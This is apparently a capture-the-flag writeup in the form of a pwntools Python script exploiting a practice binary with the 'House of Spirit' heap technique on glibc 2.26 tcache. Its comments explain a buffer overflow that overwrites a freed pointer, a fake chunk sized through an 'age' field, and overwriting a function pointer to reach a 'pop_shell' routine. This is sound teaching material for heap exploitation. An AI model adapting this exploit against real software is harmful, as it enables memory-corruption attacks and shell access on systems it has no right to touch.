'''
House of Spirit Starting Challenge writeup - Tcache on 2.26

''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.wine-2.26'
libc_name = "../../libc_versions/2.26/libc-2.26.so" 
elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript= '''
dir ../../libc_versions/2.26/
''')
else: 
	p = remote(domain, port) 

'''
The purpose of the 'House of Spirit' is to overwrite
a pointer then THIS pointer gets freed. Once this happens, 
we can create a chunk in several locations (as long 
as we can find a proper size). 
'''

# Favorite wine #1
wine_name = "B" * 4
p.sendlineafter(">", wine_name) 

'''
There is a BUFFER OVERFLOW by (accepts 0x30 bytes
but only 0x20 in size) in the 'drinker' struct. 

The drinker struct consists of the following data: 
- name (0x20 bytes) 
- wine_name (pointer) 

Using the buffer overflow described above, we can 
overwrite the 'wine_name' pointer to be an arbitrary 
value. Later on, this pointer gets 'freed'. This makes
it the perfect canidate for the 'House of Spirit' 
attack. 

Where do we place the chunk though? There are two main 
sanity checks that happen with the 'House
of Spirit': 
- Size (not too big or too small)
- Alignment (0x0 for 64-bit or 0x0 & 0x8 for 32-bit) 
https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L4153 

Size is talked about below. But, for now, the only
thing that needs to be known is that the 'state.age' variable can
be used in order to control a fake chunk size. 

For the alignment, the 'fake chunk' MUST be
at an offset for 0x0 for this 64-bit binary. 

The 'state.age' variable makes the perfect canidate for a 
size and there is a function pointer directly below it!
So, the plan is to place the pointer at this location, 
use the 'state.age' as the chunk size and overwrite the
function pointer once this chunk is allocated :) 

NOTE: The actual location for the fake chunk is
'state.age' + 0x10. This is because we are writing 
for MEMORY and not a CHUNK. The memory is at chunk + 0x10, 
whre the 'size' of a chunk is at 0x8. We need the 'size' 
to be at the MEMORY - 0x8. This can be seen below: 
-----------------------------------------------
0x0 - filler <-- Chunk pointer
0x8 - age (chunk size) 
0x10 - show function pointer <--- Memory pointer
--------------------------------------
The difference between CHUNK and MEMORY is a very 
important distinction here. 
'''
# Name
name = "A" * 0x20 
name += p64(elf.symbols['state'] + 0x10) 
p.sendlineafter(">", name) 

# Setup the FAKE chunk
# Once this is sent, the house of spirit is performed
'''
For the proper size, we NEED something that is within the TCache
size range in order for additional chunk checks to not
occur in the unsorted bin (more checks in the unsorted bin). 

However, just keeping it in the range of the TCache is ONLY
enough to NOT cause a crash; we want to have the chunk get
allocated. The next call to malloc is 'malloc(0x20)' which 
will round up to a chunk of 0x30. So, in order to get
this chunk to be given back to us for the next call to malloc, 
we will need to have a chunk of the fake size 0x30. 
'''
# The age of the wine
age = 0x30 
p.sendlineafter(">", str(age))

'''
After this step, the 'drinker->wine_name' is freed. 
This is where the 'House of Spirit' technique is launched. 
The fake chunk created above is put into the 0x30 TCache bin. 

Following this instruction, the next line allocates
via malloc. If all of the steps done above were done properly, 
it will return our fake chunk.
'''


'''
Because of the setup from before, this allcation
will return a chunk that OVERLAPS with the 'show' function
pointer. So, we will overwrite this with the location of
'pop_shell' for the function pointer. 
'''
name = p64(elf.symbols['pop_shell'])
p.sendlineafter(">", str(name))
p.interactive()


